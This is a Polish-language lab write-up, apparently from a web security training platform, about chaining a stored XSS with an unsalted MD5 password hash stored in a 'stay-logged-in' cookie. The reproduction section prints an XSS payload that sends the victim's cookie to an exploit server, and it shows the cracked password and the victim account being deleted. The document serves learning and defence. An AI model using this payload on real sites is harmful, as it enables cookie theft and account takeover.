```md
LAB: Offline password cracking  
Kategoria: Authentication  
Utworzono: 2026-04-03 00.08 (Europe/Amsterdam)

---

1. CEL TESTU

   Sprawdzenie czy przechowywanie hasha hasła w cookie umożliwia jego odzyskanie poprzez offline cracking oraz czy można wykorzystać inne podatności (XSS) do pozyskania danych uwierzytelniających.

   Testowany mechanizm:
   - persistent login (stay-logged-in)
   - przechowywanie hashy po stronie klienta

---

2. KONTEKST APLIKACJI

   Aplikacja webowa z funkcją logowania i komentarzy.

   - typ aplikacji: web (blog + login)
   - wymagania logowania:
     - username + password
   - dodatkowa funkcja:
     - „stay logged in”
   - endpointy:
     - POST /login
     - GET /my-account
     - POST /post/comment
   - inne:
     - cookie `stay-logged-in`
     - funkcjonalność komentarzy podatna na stored XSS

---

3. OBSERWACJA

   Po zalogowaniu:

   - Set-Cookie:
     - stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

   Po dekodowaniu Base64:

   wiener:51dc30ddc473d43a6011e9ebba6ca770

   Struktura:
   - username:MD5(password)

   Dodatkowa obserwacja:

   - komentarze pozwalają na wstrzyknięcie JavaScript (stored XSS)
   - możliwy dostęp do `document.cookie` ofiary

   Kluczowe:

   - cookie zawiera dane uwierzytelniające
   - hash bez soli (MD5)
   - brak podpisu / brak integralności
   - XSS umożliwia kradzież cookie innych użytkowników

---

4. HIPOTEZA

   Jeśli:
   - cookie zawiera username + hash hasła
   - możliwe jest przechwycenie cookie ofiary (XSS)

   ➜ można odzyskać hash hasła ofiary i cracknąć go offline

---

5. ANALIZA MECHANIZMU

   Mechanizm auth:

   - backend:
     - odczytuje `stay-logged-in`
     - parsuje username + hash
     - używa tego do identyfikacji użytkownika

   Mechanizm ataku:

   1. XSS:
      - umożliwia wykonanie JS w przeglądarce ofiary
      - dostęp do `document.cookie`

   2. Exfiltration:
      - cookie wysyłane na serwer atakującego

   3. Offline cracking:
      - MD5 bez soli → szybkie łamanie

   Klucz:

   - dane auth dostępne po stronie klienta
   - brak ochrony integralności
   - brak kontroli nad ujawnieniem cookie

   ➜ możliwe przejęcie konta przez odzyskanie hasła

---

6. REPRODUCTION / EXPLOIT

   Step 1 – Analiza własnego cookie

   - login jako wiener
   - decode base64:
     - username:MD5(password)

   Step 2 – Wstrzyknięcie XSS

   Payload:

   <script>
   document.location='//exploit-server/'+document.cookie
   </script>

   Step 3 – Kradzież cookie

   - exploit server log:
     - GET /?stay-logged-in=...

   Step 4 – Decode

   carlos:26323c16d5f4dabff3bb136f2460a943

   Step 5 – Crack

   - MD5 → onceuponatime

   Step 6 – Login

   - username: carlos
   - password: onceuponatime

   Step 7 – Final

   - /my-account
   - delete account

   ➜ LAB SOLVED

---

7. IMPACT

   - przejęcie konta dowolnego użytkownika
   - odzyskanie plaintext password
   - możliwość lateral movement (reuse haseł)
   - chainowanie podatności (XSS + auth flaw)

---

8. DEBUGGING / PITFALLS

   Problemy:

   - skupienie się tylko na własnym cookie (wiener)
   - próba brute-force zamiast zdobycia hasha ofiary
   - ignorowanie XSS jako wektora wejścia
   - overengineering (manipulacja session)
   - brak spojrzenia na full attack surface

   Rozwiązania:

   - analiza całej aplikacji (nie tylko auth)
   - identyfikacja punktów wejścia (XSS)
   - pytanie: „skąd wziąć dane?”
   - łączenie podatności w chain

---

9. MENTAL MODEL / PATTERN

   XSS → COOKIE THEFT → OFFLINE CRACKING → ACCOUNT TAKEOVER

   Klucz:

   > "Najpierw zdobądź dane, potem je exploituj"

   Sygnały ostrzegawcze:

   - cookie zawierające:
     - username
     - hash hasła
   - base64 → czytelna struktura
   - hash bez soli
   - brak podpisu / brak HMAC
   - obecność XSS w aplikacji

   Rozszerzenie:

   - JWT bez podpisu
   - session tokens bez integralności
   - inne client-side auth artifacts
LAB: Offline password cracking  
Kategoria: Authentication  
Utworzono: 2026-04-03 22:xx (Europe/Amsterdam)


```
